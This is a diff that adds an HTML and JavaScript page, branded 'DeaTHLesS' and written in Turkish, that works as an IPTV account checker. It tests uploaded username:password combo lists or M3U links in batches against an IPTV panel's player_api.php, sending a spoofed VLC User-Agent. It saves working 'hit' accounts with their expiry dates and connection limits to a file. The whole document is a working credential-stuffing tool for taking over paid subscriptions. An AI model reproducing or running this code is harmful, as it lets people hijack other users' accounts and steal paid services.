@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IPTV Link Checker</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: url('https://i.hizliresim.com/e4aib5i.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        h1 {
+            font-size: 3em;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 30px #00ff00;
+            animation: neon 1.5s ease-in-out infinite alternate;
+            margin-top: 30px;
+        }
+        @keyframes neon {
+            from { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 30px #00ff00, 0 0 40px #00ff00; }
+            to { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00, 0 0 40px #00ff00, 0 0 60px #00ff00; }
+        }
+        form, #output, #progress {
+            background: rgba(255, 255, 255, 0.9);
+            color: #000;
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px auto;
+            width: 80%;
+            max-width: 800px;
+            box-sizing: border-box;
+        }
+        textarea {
+            width: 100%;
+            height: 200px;
+            resize: vertical;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #00ff00;
+            box-sizing: border-box;
+        }
+        input[type="text"], input[type="file"] {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #00ff00;
+            margin-bottom: 10px;
+            box-sizing: border-box;
+        }
+        button {
+            background: #00ff00;
+            border: none;
+            padding: 10px 20px;
+            font-size: 1em;
+            cursor: pointer;
+            border-radius: 5px;
+            margin: 5px;
+        }
+        button:hover {
+            background: #00cc00;
+        }
+        #progress {
+            margin-top: 20px;
+            font-size: 1.2em;
+            color: #00ff00;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 15px;
+            border-radius: 5px;
+            display: none;
+            border: 1px solid #00ff00;
+        }
+        #current-link {
+            font-weight: bold;
+            color: #ffcc00;
+            word-break: break-all;
+        }
+        #progress p {
+            margin: 5px 0;
+        }
+        #error-log {
+            background: rgba(255, 0, 0, 0.9);
+            color: #fff;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+            margin: 10px auto;
+            width: 80%;
+            max-width: 800px;
+        }
+        @media (max-width: 600px) {
+            h1 { font-size: 2em; }
+            form, #output, #progress, #error-log { width: 95%; }
+            textarea { height: 150px; }
+        }
+    </style>
+</head>
+<body>
+    <h1>DeaTHLesS</h1>
+    <form id="scan-form">
+        <label for="panel_url">Panel Adresi (Combo tarama için zorunlu, örn: http://panel:port):</label><br>
+        <input type="text" name="panel_url" id="panel_url" placeholder="Panel adresini girin"><br><br>
+        <label for="combo_file">Combo Dosyası Yükle (.txt):</label><br>
+        <input type="file" name="combo_file" id="combo_file" accept=".txt"><br><br>
+        <label for="iptv_links">Veya Manuel Combo/Link Gir:</label><br>
+        <textarea name="iptv_links" id="iptv_links" placeholder="M3U linkleri veya kullanıcı_adı:şifre formatında combo listesi girin"></textarea>
+        <br>
+        <button type="button" id="start-btn" onclick="toggleScan()">Tara</button>
+        <button type="button" id="stop-btn" onclick="stopScan()" style="display: none;">Durdur</button>
+    </form>
+    <div id="progress">
+        <p>Toplam: <span id="total-links">0</span> | Taranan: <span id="scanned-links">0</span> | Kalan: <span id="remaining-links">0</span></p>
+        <p>Aktif: <span id="active-count">0</span> | Pasif: <span id="inactive-count">0</span></p>
+        <p>Şu an taranan: <span id="current-link">Yok</span></p>
+    </div>
+    <div id="error-log">
+        <p>Hata Kayıtları: <span id="error-messages"></span></p>
+    </div>
+    <div id="output">
+        <textarea id="active_links" placeholder="Aktif linkler burada görünecek" readonly></textarea>
+        <button onclick="copyToClipboard()">Tümünü Kopyala</button>
+        <button onclick="downloadResults()">Sonuçları İndir</button>
+    </div>
+
+    <script>
+        let links = [];
+        let totalLinks = 0;
+        let scannedLinks = 0;
+        let activeCount = 0;
+        let inactiveCount = 0;
+        let scanType = '';
+        let errorLog = [];
+        const batchSize = 10;
+        let isScanning = false;
+        let scanController = null;
+
+        async function toggleScan() {
+            if (!isScanning) {
+                startScan();
+            } else {
+                stopScan();
+            }
+        }
+
+        async function startScan() {
+            errorLog = [];
+            document.getElementById('error-messages').textContent = '';
+            document.getElementById('error-log').style.display = 'none';
+            document.getElementById('active_links').value = ''; // Temizle
+            document.getElementById('start-btn').style.display = 'none';
+            document.getElementById('stop-btn').style.display = 'block';
+
+            const form = document.getElementById('scan-form');
+            const formData = new FormData(form);
+            let iptvLinks = [];
+
+            const fileInput = document.getElementById('combo_file');
+            if (fileInput.files.length > 0) {
+                const file = fileInput.files[0];
+                try {
+                    const text = await file.text();
+                    iptvLinks = text.split('\n').map(link => link.trim()).filter(link => link);
+                } catch (e) {
+                    document.getElementById('active_links').value = 'Dosya okuma hatası: ' + e.message;
+                    resetButtons();
+                    return;
+                }
+            } else {
+                iptvLinks = formData.get('iptv_links').trim().split('\n').map(link => link.trim()).filter(link => link);
+            }
+
+            links = iptvLinks;
+            totalLinks = links.length;
+            scannedLinks = 0;
+            activeCount = 0;
+            inactiveCount = 0;
+
+            if (totalLinks > 1000000) {
+                if (!confirm(`Çok fazla combo (${totalLinks}) yüklendi. Bu, tarayıcıyı yavaşlatabilir veya çökertebilir. Devam etmek istiyor musunuz?`)) {
+                    document.getElementById('active_links').value = 'Tarama iptal edildi.';
+                    resetButtons();
+                    return;
+                }
+            }
+
+            scanType = detectScanType(links);
+            if (!scanType) {
+                document.getElementById('active_links').value = 'Geçersiz format: Lütfen M3U linkleri veya kullanıcı_adı:şifre formatında combo listesi girin.';
+                resetButtons();
+                return;
+            }
+            if (scanType === 'combo' && !formData.get('panel_url').trim()) {
+                document.getElementById('active_links').value = 'Combo tarama için panel adresi zorunlu.';
+                resetButtons();
+                return;
+            }
+
+            document.getElementById('total-links').textContent = totalLinks;
+            document.getElementById('scanned-links').textContent = scannedLinks;
+            document.getElementById('remaining-links').textContent = totalLinks - scannedLinks;
+            document.getElementById('active-count').textContent = activeCount;
+            document.getElementById('inactive-count').textContent = inactiveCount;
+            document.getElementById('progress').style.display = 'block';
+            isScanning = true;
+
+            scanController = { index: 0 };
+            await scanBatch(formData, scanController);
+        }
+
+        function detectScanType(links) {
+            if (links.length === 0) return null;
+            const firstLink = links[0];
+            if (/^https?:\/\//i.test(firstLink)) return 'm3u';
+            if (/^[^:]+:[^:]+$/.test(firstLink)) return 'combo';
+            return null;
+        }
+
+        async function scanBatch(formData, controller) {
+            if (!isScanning || controller.index >= totalLinks) {
+                resetButtons();
+                document.getElementById('progress').style.display = 'none';
+                document.getElementById('current-link').textContent = 'Tarama tamamlandı!';
+                return;
+            }
+
+            const batchLinks = links.slice(controller.index, controller.index + batchSize);
+            document.getElementById('current-link').textContent = batchLinks.join(', ');
+            const results = await Promise.all(batchLinks.map(link => checkLink(link, formData)));
+
+            results.forEach(result => {
+                if (result.success && result.link_info) {
+                    document.getElementById('active_links').value += result.link_info + '\n'; // Anında yaz
+                    document.getElementById('active_links').scrollTop = document.getElementById('active_links').scrollHeight;
+                    activeCount++;
+                } else {
+                    inactiveCount++;
+                }
+                scannedLinks++;
+            });
+
+            document.getElementById('scanned-links').textContent = scannedLinks;
+            document.getElementById('remaining-links').textContent = totalLinks - scannedLinks;
+            document.getElementById('active-count').textContent = activeCount;
+            document.getElementById('inactive-count').textContent = inactiveCount;
+
+            controller.index += batchSize;
+            if (isScanning) {
+                setTimeout(() => scanBatch(formData, controller), 50);
+            }
+        }
+
+        async function checkLink(link, formData) {
+            let url = link;
+            const panelUrl = formData.get('panel_url').trim().replace(/\/+$/, '');
+
+            let username, password, baseUrl;
+            if (scanType === 'combo') {
+                if (!panelUrl) return { success: false, link, error: 'Panel URL eksik' };
+                const [user, pass] = link.split(':');
+                if (!user || !pass) return { success: false, link, error: 'Geçersiz combo formatı' };
+                username = user;
+                password = pass;
+                url = `${panelUrl}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`;
+                baseUrl = panelUrl;
+            } else {
+                try {
+                    const parsedUrl = new URL(url);
+                    baseUrl = `${parsedUrl.protocol}//${parsedUrl.hostname}${parsedUrl.port ? ':' + parsedUrl.port : ''}`;
+                    const params = new URLSearchParams(parsedUrl.search);
+                    username = params.get('username') || '';
+                    password = params.get('password') || '';
+                    if (!username || !password) return { success: false, link, error: 'Geçersiz M3U formatı' };
+                } catch (e) {
+                    return { success: false, link, error: 'Geçersiz URL' };
+                }
+            }
+
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 5000);
+                const apiUrl = `${baseUrl}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+                const response = await fetch(apiUrl, {
+                    method: 'GET',
+                    headers: {
+                        'User-Agent': 'VLC/3.0.16 LibVLC/3.0.16',
+                        'Accept': '*/*',
+                        'Accept-Encoding': 'gzip, deflate'
+                    },
+                    signal: controller.signal,
+                    redirect: 'follow'
+                });
+                clearTimeout(timeoutId);
+
+                if (!response.ok) {
+                    return { success: false, link, error: `HTTP ${response.status} hatası` };
+                }
+
+                const data = await response.json();
+                if (!data.user_info || data.user_info.status !== 'Active') {
+                    return { success: false, link, error: 'API yanıtı geçersiz veya durum Active değil' };
+                }
+
+                const userInfo = data.user_info;
+                const info = {
+                    status: userInfo.status,
+                    exp_date: userInfo.exp_date ? new Date(userInfo.exp_date * 1000).toLocaleString('tr-TR') : 'Sınırsız',
+                    created_at: userInfo.created_at ? new Date(userInfo.created_at * 1000).toLocaleString('tr-TR') : 'Bilinmiyor',
+                    max_connections: userInfo.max_connections || 'Bilinmiyor',
+                    active_connections: userInfo.active_cons < userInfo.max_connections ? 'Evet' : 'Hayır'
+                };
+
+                const linkInfo = formatLinkInfo(url, info);
+                return { success: true, link, link_info: linkInfo };
+            } catch (error) {
+                return { success: false, link, error: error.message.includes('AbortError') ? 'Zaman aşımı' : error.message };
+            }
+        }
+
+        function formatLinkInfo(url, info) {
+            const { exp_date, created_at, active_connections, max_connections } = info;
+            const parsedUrl = new URL(url);
+            const params = new URLSearchParams(parsedUrl.search);
+            const username = params.get('username') || '';
+            const password = params.get('password') || '';
+            const baseUrl = `${parsedUrl.protocol}//${parsedUrl.hostname}${parsedUrl.port ? ':' + parsedUrl.port : ''}`;
+            const m3uLink = `${baseUrl}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`;
+
+            let output = `
+╭─➤ 🔥⫷DeaTHLesS⫸🔥    
+├─ Başlangıç Tarihi ➤ ${created_at}
+├─ Bitiş Tarihi ➤ ${exp_date}
+├─ Aktif Bağlantılar ➤ ${active_connections}
+├─ Maksimum Bağlantılar ➤ ${max_connections}
+╰─➤ 🔥⫷DeaTHLesS⫸🔥    
+●➤ ${m3uLink}
+✪✪`;
+            return output;
+        }
+
+        function copyToClipboard() {
+            const copyText = document.getElementById('active_links');
+            copyText.select();
+            document.execCommand('copy');
+            alert('Kopyalandı!');
+        }
+
+        function downloadResults() {
+            const text = document.getElementById('active_links').value;
+            const blob = new Blob([text], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'hit-iptv-m3u.txt';
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function stopScan() {
+            isScanning = false;
+            errorLog = []; // Hata loglarını sıfırla
+            document.getElementById('error-messages').textContent = '';
+            document.getElementById('error-log').style.display = 'none';
+            resetButtons();
+            document.getElementById('progress').style.display = 'none';
+            document.getElementById('current-link').textContent = 'Tarama durduruldu, son kaldığı yerden devam edebilirsin!';
+        }
+
+        function resetButtons() {
+            document.getElementById('start-btn').style.display = 'block';
+            document.getElementById('stop-btn').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
